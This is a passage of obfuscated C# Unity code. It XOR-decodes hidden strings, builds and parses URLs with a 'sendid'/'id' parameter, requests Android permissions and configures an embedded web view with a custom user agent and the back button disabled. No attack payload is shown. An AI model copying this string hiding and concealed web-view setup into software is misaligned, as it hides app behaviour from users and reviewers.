            return _0x642e6d26 + _0x4cb14bc7._0x3fe507a8(new byte[8] { 90, 22, 0, 11, 1, 12, 1, 88 }, 101) + UnityWebRequest.EscapeURL(_0x79083906);
    }

    private bool _0x3c82bd28 = false;
    internal bool ContainsIgnoreCase(string _0x9e236f67, string _0xedf43d72)
    {
        if (string.IsNullOrEmpty(_0x9e236f67) || string.IsNullOrEmpty(_0xedf43d72))
            return false;
        return _0x9e236f67.IndexOf(_0xedf43d72, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal Vector2 lastSize = Vector2.zero;
    internal string _0x20857176(string _0x6ca95521)
    {
        int _0x4d1fc056 = _0x6ca95521.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[3] { 234, 231, 190 }, 131), StringComparison.OrdinalIgnoreCase);
        if (_0x4d1fc056 < 0)
            return null;
        string _0x318f1d0b = _0x6ca95521.Substring(_0x4d1fc056 + 3);
        int _0xeace0b45 = _0x318f1d0b.IndexOf('&');
        return _0xeace0b45 >= 0 ? _0x318f1d0b.Substring(0, _0xeace0b45) : _0x318f1d0b;
    }

    private bool _0x2f5a1583 = false;
    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x3a0b7f3f)
    {
        if (Permission.HasUserAuthorizedPermission(_0x3a0b7f3f))
            yield break;
        bool _0x70ea7842 = false;
        var _0xd00bfdf1 = new PermissionCallbacks();
        _0xd00bfdf1.PermissionGranted += _0xa08fec6e => _0x70ea7842 = true;
        _0xd00bfdf1.PermissionDenied += _0xa08fec6e => _0x70ea7842 = true;
        Permission.RequestUserPermission(_0x3a0b7f3f, _0xd00bfdf1);
        yield return new WaitUntil(() => _0x70ea7842);
    }

    private string _0x398c5835;
    // NATIVE WEB VIEW METHODS
    private UniWebView _0x287240ce = null;
    private string _0x16170c7f;
    private void _0xadcca50f(UniWebView _0x4bc0a1de)
    {
        _0x4bc0a1de.BackgroundColor = Color.clear;
        _0x4bc0a1de.SetSupportMultipleWindows(true, true);
        _0x4bc0a1de.SetBackButtonEnabled(false);
        _0x287240ce.SetUserAgent(_0x72539260());
    }

    private string _0xe38e456b = "";
    private void _0xa94fcee3(bool _0x51fc1a22)
    {
        _0x72fad87f();
        _0xc81032a9.SetActive(_0x51fc1a22);
        _0x3c82bd28 = _0x51fc1a22;
        if (_0x51fc1a22)
        {
            _0xc81032a9.transform.SetAsLastSibling();
            if (_0x8f34df81 != null)
                _0x8f34df81.localRotation = Quaternion.identity;
        }
    }
}

internal static class _0x4cb14bc7
{
    internal static string _0x3fe507a8(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}